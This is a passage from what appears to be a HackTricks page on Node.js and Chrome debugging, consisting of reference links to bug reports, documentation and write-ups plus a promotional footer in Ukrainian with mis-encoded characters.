* [https://bugs.chromium.org/p/project-zero/issues/detail?id=773](https://bugs.chromium.org/p/project-zero/issues/detail?id=773)
* [https://bugs.chromium.org/p/project-zero/issues/detail?id=1742](https://bugs.chromium.org/p/project-zero/issues/detail?id=1742)
* [https://bugs.chromium.org/p/project-zero/issues/detail?id=1944](https://bugs.chromium.org/p/project-zero/issues/detail?id=1944)
* [https://nodejs.org/en/docs/guides/debugging-getting-started/](https://nodejs.org/en/docs/guides/debugging-getting-started/)
* [https://chromedevtools.github.io/devtools-protocol/](https://chromedevtools.github.io/devtools-protocol/)
* [https://larry.science/post/corctf-2021/#saasme-2-solves](https://larry.science/post/corctf-2021/#saasme-2-solves)
* [https://embracethered.com/blog/posts/2020/chrome-spy-remote-control/](https://embracethered.com/blog/posts/2020/chrome-spy-remote-control/)

<details>

<summary><strong>–í–∏–≤—á–∞–π—Ç–µ —Ö–∞–∫—ñ–Ω–≥ AWS –≤—ñ–¥ –Ω—É–ª—è –¥–æ –≥–µ—Ä–æ—è –∑</strong> <a href="https://training.hacktricks.xyz/courses/arte"><strong>htARTE (HackTricks AWS Red Team Expert)</strong></a><strong>!</strong></summary>

–Ü–Ω—à—ñ —Å–ø–æ—Å–æ–±–∏ –ø—ñ–¥—Ç—Ä–∏–º–∫–∏ HackTricks:

* –Ø–∫—â–æ –≤–∏ —Ö–æ—á–µ—Ç–µ –ø–æ–±–∞—á–∏—Ç–∏ –≤–∞—à—É **–∫–æ–º–ø–∞–Ω—ñ—é —Ä–µ–∫–ª–∞–º–æ–≤–∞–Ω—É –≤ HackTricks** –∞–±–æ **–∑–∞–≤–∞–Ω—Ç–∞–∂–∏—Ç–∏ HackTricks —É —Ñ–æ—Ä–º–∞—Ç—ñ PDF**, –ø–µ—Ä–µ–≤—ñ—Ä—Ç–µ [**–ü–õ–ê–ù–ò –ü–Ü–î–ü–ò–°–ö–ò**](https://github.com/sponsors/carlospolop)!
* –û—Ç—Ä–∏–º–∞–π—Ç–µ [**–æ—Ñ—ñ—Ü—ñ–π–Ω–∏–π PEASS & HackTricks –º–µ—Ä—á**](https://peass.creator-spring.com)
* –í—ñ–¥–∫—Ä–∏–π—Ç–µ –¥–ª—è —Å–µ–±–µ [**–°—ñ–º'—é PEASS**](https://opensea.io/collection/the-peass-family), –Ω–∞—à—É –∫–æ–ª–µ–∫—Ü—ñ—é –µ–∫—Å–∫–ª—é–∑–∏–≤–Ω–∏—Ö [**NFT**](https://opensea.io/collection/the-peass-family)
* **–ü—Ä–∏—î–¥–Ω—É–π—Ç–µ—Å—å –¥–æ** üí¨ [**–≥—Ä—É–ø–∏ Discord**](https://discord.gg/hRep4RUj7f) –∞–±–æ [**–≥—Ä—É–ø–∏ Telegram**](https://t.me/peass) –∞–±–æ **—Å–ª—ñ–¥–∫—É–π—Ç–µ** –∑–∞ –Ω–∞–º–∏ –Ω–∞ **Twitter** üê¶ [**@hacktricks_live**](https://twitter.com/hacktricks_live)**.**
* **–ü–æ–¥—ñ–ª—ñ—Ç—å—Å—è —Å–≤–æ—ó–º–∏ —Ö–∞–∫–µ—Ä—Å—å–∫–∏–º–∏ —Ç—Ä—é–∫–∞–º–∏, –Ω–∞–¥—Å–∏–ª–∞–π—Ç–µ PR –¥–æ** [**HackTricks**](https://github.com/carlospolop/hacktricks) —Ç–∞ [**HackTricks Cloud**](https://github.com/carlospolop/hacktricks-cloud) —Ä–µ–ø–æ–∑–∏—Ç–æ—Ä—ñ—ó–≤.

</details>
